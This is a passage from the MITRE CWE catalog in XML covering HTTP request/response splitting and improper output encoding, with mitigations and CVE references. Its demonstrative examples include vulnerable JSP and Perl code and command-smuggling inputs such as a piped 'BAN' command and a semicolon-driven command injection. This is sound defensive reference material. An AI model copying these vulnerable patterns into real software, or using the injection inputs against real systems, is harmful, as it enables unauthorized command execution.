            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Once attackers have control of the responses sent by an application, they have a choice of a variety of malicious content to provide users.</Intro_Text>
               <Body_Text>
                 <xhtml:p>Cross-Site Scripting: cross-site scripting is common form of attack where malicious JavaScript or other code included in a response is executed in the user's browser.</xhtml:p>
                     <xhtml:p>The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.</xhtml:p>
                     <xhtml:p>The most common and dangerous attack vector against users of a vulnerable application uses JavaScript to transmit session and authentication information back to the attacker who can then take complete control of the victim's account.</xhtml:p>
               </Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In addition to using a vulnerable application to send malicious content to a user, the same weakness can also be leveraged to redirect sensitive content generated by the server to the attacker instead of the intended user.</Intro_Text>
               <Body_Text>
                     <xhtml:p>Page Hijacking: by submitting a request that results in two responses, the intended response from the server and the response generated by the attacker, an attacker can cause an intermediate node, such as a shared proxy server, to misdirect a response generated by the server to the attacker instead of the intended user.</xhtml:p>
                     <xhtml:p>Because the request made by the attacker generates two responses, the first is interpreted as a response to the attacker's request, while the second remains in limbo. When the user makes a legitimate request through the same TCP connection, the attacker's request is already waiting and is interpreted as a response to the victim's request. The attacker then sends a second request to the server, to which the proxy server responds with the server generated request intended for the victim, thereby compromising any sensitive information in the headers or body of the response intended for the victim.</xhtml:p>
               </Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
	   <Observed_Example>
               <Reference>CVE-2020-15811</Reference>
               <Description>Chain: Proxy uses a substring search instead of parsing the Transfer-Encoding header (CWE-697), allowing request splitting (CWE-113) and cache poisoning</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-15811</Link>
	   </Observed_Example>
	   <Observed_Example>
               <Reference>CVE-2021-41084</Reference>
               <Description>Scala-based HTTP interface allows request splitting and response splitting through header names, header values, status reasons, and URIs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-41084</Link>
	   </Observed_Example>
	   <Observed_Example>
               <Reference>CVE-2018-12116</Reference>
               <Description>Javascript-based framework allows request splitting through a path option of an HTTP request</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2018-12116</Link>
	   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2146</Reference>
               <Description>Application accepts CRLF in an object ID, allowing HTTP response splitting.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2146</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1656</Reference>
               <Description>Shopping cart allows HTTP response splitting to perform HTML injection via CRLF in a parameter for a url</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1656</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2060</Reference>
               <Description>Bulletin board allows response splitting via CRLF in parameter.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2060</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2512</Reference>
               <Description>Response splitting via CRLF in PHPSESSID.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2512</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1951</Reference>
               <Description>e-commerce app allows HTTP response splitting using CRLF in object id parameters</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1951</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>HTTP response splitting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>HTTP Response Splitting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>25</Entry_ID>
               <Entry_Name>HTTP Response Splitting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="105"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="34"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-43"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and Response Splitting).&#34; Page 31"/>
	    <Reference External_Reference_ID="REF-1272"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated References, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Observed_Example, Other_Notes, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Other_Notes, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Potential_Mitigations, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
				  <Modification_Name>CWE Content Team</Modification_Name>
				  <Modification_Organization>MITRE</Modification_Organization>
				  <Modification_Date>2022-06-28</Modification_Date>
				  <Modification_Importance>Critical</Modification_Importance>
				  <Modification_Comment>Extended the abstraction of this entry to include both HTTP request and response splitting.</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Common_Consequences, Demonstrative_Examples, Description, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Theoretical_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>Jonathan Leitschuh</Contribution_Name>
               <Contribution_Organization>Dan Kaminsky Fellowship @ HUMAN Security</Contribution_Organization>
               <Contribution_Date>2022-02-25</Contribution_Date>
               <Contribution_Comment>Suggested a new entry for HTTP Request Splitting, leading to scope expansion for CWE-113</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2008-04-11">HTTP Response Splitting</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize CRLF Sequences in HTTP Headers (aka 'HTTP Response Splitting')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Failure to Sanitize CRLF Sequences in HTTP Headers ('HTTP Response Splitting')</Previous_Entry_Name>
			<Previous_Entry_Name Date="2022-06-28">Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="116" Name="Improper Encoding or Escaping of Output" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly. As a result, the intended structure of the message is not preserved.</Description>
         <Extended_Description>
            <xhtml:p>Improper encoding or escaping can allow attackers to change the commands that are sent to another component, inserting malicious commands instead.</xhtml:p>
            <xhtml:p>Most products follow a certain protocol that uses structured messages for communication between components, such as queries or commands. These structured messages can contain raw data interspersed with metadata or control information. For example, "GET /index.html HTTP/1.1" is a structured message containing a command ("GET") with a single argument ("/index.html") and metadata about which protocol version is being used ("HTTP/1.1").</xhtml:p>
            <xhtml:p>If an application uses attacker-supplied inputs to construct a structured message without properly encoding or escaping, then the attacker could insert special characters that will cause the data to be interpreted as control information or metadata. Consequently, the component that receives the output will perform the wrong operations, or otherwise interpret the data incorrectly.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="707" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="74" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Often"/>
            <Technology Name="Database Server" Prevalence="Often"/>
            <Technology Name="Web Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Output Sanitization</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Output Validation</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Output Encoding</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>The communications between components can be modified in unexpected ways. Unexpected commands can be executed, bypassing other security mechanisms. Incoming data can be misinterpreted.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>The communications between components can be modified in unexpected ways. Unexpected commands can be executed, bypassing other security mechanisms. Incoming data can be misinterpreted.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>The communications between components can be modified in unexpected ways. Unexpected commands can be executed, bypassing other security mechanisms. Incoming data can be misinterpreted.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4.3">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.</xhtml:p>
                  <xhtml:p>Alternately, use built-in functions, but consider using wrappers in case those functions are discovered to have a vulnerability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>
                  <xhtml:p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</xhtml:p>
                  <xhtml:p>For example, stored procedures can enforce database query structure and reduce the likelihood of SQL injection.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>In some cases, input validation may be an important strategy when output encoding is not a complete solution. For example, you may be providing the same output that will be processed by multiple consumers that use different encodings or representations. In other cases, you may be required to allow user-supplied input to contain control information, such as limited HTML tags that support formatting in a wiki or bulletin board. When this type of requirement must be met, use an extremely strict allowlist to limit which control sequences can be used. Verify that the resulting syntactic structure is what you expect. Use your normal encoding methods for the remainder of the input.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use input validation as a defense-in-depth measure to reduce the likelihood of output encoding errors (see CWE-20).</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Fully specify which encodings are required by components that will be communicating with each other.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code displays an email address that was submitted as part of a form.</Intro_Text>
               <Example_Code Nature="Bad" Language="JSP">
                  <xhtml:div>&lt;% String email = request.getParameter("email"); %&gt;<xhtml:br/>...<xhtml:br/>Email Address: &lt;%= email %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The value read from the form parameter is reflected back to the client browser without having been encoded prior to output, allowing various XSS attacks (CWE-79).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Consider a chat application in which a front-end web application communicates with a back-end server. The back-end is legacy code that does not perform authentication or authorization, so the front-end must implement it. The chat protocol supports two commands, SAY and BAN, although only administrators can use the BAN command. Each argument must be separated by a single space. The raw inputs are URL-encoded. The messaging protocol allows multiple commands to be specified on the same line if they are separated by a "|" character.</Intro_Text>
               <Body_Text>First let's look at the back end command processor code</Body_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>$inputString = readLineFromFileHandle($serverFH);<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># generate an array of strings separated by the "|" character.</xhtml:i>
                     <xhtml:br/>@commands = split(/\|/, $inputString);<xhtml:br/>
                     <xhtml:br/>foreach $cmd (@commands) {<xhtml:div style="margin-left:1em;">
                        <xhtml:br/>
                        <xhtml:i># separate the operator from its arguments based on a single whitespace</xhtml:i>
                        <xhtml:br/>($operator, $args) = split(/ /, $cmd, 2);<xhtml:br/>
                        <xhtml:br/>$args = UrlDecode($args);<xhtml:br/>if ($operator eq "BAN") {<xhtml:div style="margin-left:1em;">ExecuteBan($args);</xhtml:div>}<xhtml:br/>elsif ($operator eq "SAY") {<xhtml:div style="margin-left:1em;">ExecuteSay($args);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The front end web application receives a command, encodes it for sending to the server, performs the authorization check, and sends the command to the server.</Body_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>$inputString = GetUntrustedArgument("command");<xhtml:br/>($cmd, $argstr) = split(/\s+/, $inputString, 2);<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># removes extra whitespace and also changes CRLF's to spaces</xhtml:i>
                     <xhtml:br/>$argstr =~ s/\s+/ /gs;<xhtml:br/>
                     <xhtml:br/>$argstr = UrlEncode($argstr);<xhtml:br/>if (($cmd eq "BAN") &amp;&amp; (! IsAdministrator($username))) {<xhtml:div style="margin-left:1em;">die "Error: you are not the admin.\n";</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># communicate with file server using a file handle</xhtml:i>
                     <xhtml:br/>$fh = GetServerFileHandle("myserver");<xhtml:br/>
                     <xhtml:br/>print $fh "$cmd $argstr\n";</xhtml:div>
               </Example_Code>
               <Body_Text>It is clear that, while the protocol and back-end allow multiple commands to be sent in a single request, the front end only intends to send a single command. However, the UrlEncode function could leave the "|" character intact. If an attacker provides:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>SAY hello world|BAN user12</xhtml:div>
               </Example_Code>
               <Body_Text>then the front end will see this is a "SAY" command, and the $argstr will look like "hello world | BAN user12". Since the command is "SAY", the check for the "BAN" command will fail, and the front end will send the URL-encoded command to the back end:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>SAY hello%20world|BAN%20user12</xhtml:div>
               </Example_Code>
               <Body_Text>The back end, however, will treat these as two separate commands:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>SAY hello world<xhtml:br/>BAN user12</xhtml:div>
               </Example_Code>
               <Body_Text>Notice, however, that if the front end properly encodes the "|" with "%7C", then the back end will only process a single command.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example takes user input, passes it through an encoding scheme and then creates a directory specified by the user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>sub GetUntrustedInput {<xhtml:div style="margin-left:1em;">return($ARGV[0]);</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub encode {<xhtml:div style="margin-left:1em;">my($str) = @_;<xhtml:br/>$str =~ s/\&amp;/\&amp;amp;/gs;<xhtml:br/>$str =~ s/\"/\&amp;quot;/gs;<xhtml:br/>$str =~ s/\'/\&amp;apos;/gs;<xhtml:br/>$str =~ s/\&lt;/\&amp;lt;/gs;<xhtml:br/>$str =~ s/\&gt;/\&amp;gt;/gs;<xhtml:br/>return($str);</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub doit {<xhtml:div style="margin-left:1em;">my $uname = encode(GetUntrustedInput("username"));<xhtml:br/>print "&lt;b&gt;Welcome, $uname!&lt;/b&gt;&lt;p&gt;\n";<xhtml:br/>system("cd /home/$uname; /bin/ls -l");<xhtml:br/>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer attempts to encode dangerous characters, however the denylist for encoding is incomplete (CWE-184) and an attacker can still pass a semicolon, resulting in a chain with command injection (CWE-77).</Body_Text>
               <Body_Text>Additionally, the encoding routine is used inappropriately with command execution. An attacker doesn't even need to insert their own semicolon. The attacker can instead leverage the encoding routine to provide the semicolon to separate the commands. If an attacker supplies a string of the form:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>' pwd</xhtml:div>
               </Example_Code>
               <Body_Text>then the program will encode the apostrophe and insert the semicolon, which functions as a command separator when passed to the system function. This allows the attacker to complete the command injection.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-41232</Reference>
               <Description>Chain: authentication routine in Go-based agile development product does not escape user name (CWE-116), allowing LDAP injection (CWE-90)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-41232</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4636</Reference>
               <Description>OS command injection in backup software using shell metacharacters in a filename; correct behavior would require that this filename could not be changed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4636</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0769</Reference>
               <Description>Web application does not set the charset when sending a page to a browser, allowing for XSS exploitation when a browser chooses an unexpected encoding.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0769</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0005</Reference>
               <Description>Program does not set the charset when sending a page to a browser, allowing for XSS exploitation when a browser chooses an unexpected encoding.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0005</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5573</Reference>
               <Description>SQL injection via password parameter; a strong password might contain "&amp;"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5573</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3773</Reference>
               <Description>Cross-site scripting in chat application via a message subject, which normally might contain "&amp;" and other XSS-related characters.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3773</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0757</Reference>
               <Description>Cross-site scripting in chat application via a message, which normally might be allowed to contain arbitrary content.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0757</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>22</Entry_ID>
               <Entry_Name>Improper Output Handling</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>IDS00-J</Entry_ID>
               <Entry_Name>Sanitize untrusted data passed across a trust boundary</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>IDS05-J</Entry_ID>
               <Entry_Name>Use a subset of ASCII for file and path names</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Oracle Coding Standard for Java">
               <Entry_ID>IDS00-J</Entry_ID>
               <Entry_Name>Prevent SQL injection</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>IDS33-PL</Entry_ID>
               <Entry_Name>Sanitize untrusted data passed across a trust boundary</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="104"/>
            <Related_Attack_Pattern CAPEC_ID="73"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-46"/>
            <Reference External_Reference_ID="REF-47"/>
            <Reference External_Reference_ID="REF-48"/>
            <Reference External_Reference_ID="REF-49"/>
            <Reference External_Reference_ID="REF-50"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 11, &#34;Canonical Representation Issues&#34; Page 363"/>
         </References>
         <Notes>
            <Note Type="Relationship">This weakness is primary to all weaknesses related to injection (CWE-74) since the inherent nature of injection involves the violation of structured messages.</Note>
            <Note Type="Relationship">
               <xhtml:p>CWE-116 and CWE-20 have a close association because, depending on the nature of the structured message, proper input validation can indirectly prevent special characters from changing the meaning of a structured message. For example, by validating that a numeric ID field should only contain the 0-9 characters, the programmer effectively prevents injection attacks.</xhtml:p>
               <xhtml:p>However, input validation is not always sufficient, especially when less stringent data types must be supported, such as free-form text. Consider a SQL injection scenario in which a last name is inserted into a query. The name "O'Reilly" would likely pass the validation step since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the "'" apostrophe character, which would need to be escaped or otherwise neutralized. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.</xhtml:p>
            </Note>
            <Note Type="Terminology">The usage of the "encoding" and "escaping" terms varies widely. For example, in some programming languages, the terms are used interchangeably, while other languages provide APIs that use both terms for different tasks. This overlapping usage extends to the Web, such as the "escape" JavaScript function whose purpose is stated to be encoding. The concepts of encoding and escaping predate the Web by decades. Given such a context, it is difficult for CWE to adopt a consistent vocabulary that will not be misinterpreted by some constituency.</Note>
            <Note Type="Theoretical">This is a data/directive boundary error in which data boundaries are not sufficiently enforced before it is sent to a different control sphere.</Note>
            <Note Type="Research Gap">While many published vulnerabilities are related to insufficient output encoding, there is such an emphasis on input validation as a protection mechanism that the underlying causes are rarely described. Within CVE, the focus is primarily on well-understood issues like cross-site scripting and SQL injection. It is likely that this weakness frequently occurs in custom protocols that support multiple encodings, which are not necessarily detectable with automated techniques.</Note>
         </Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2006-07-19</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
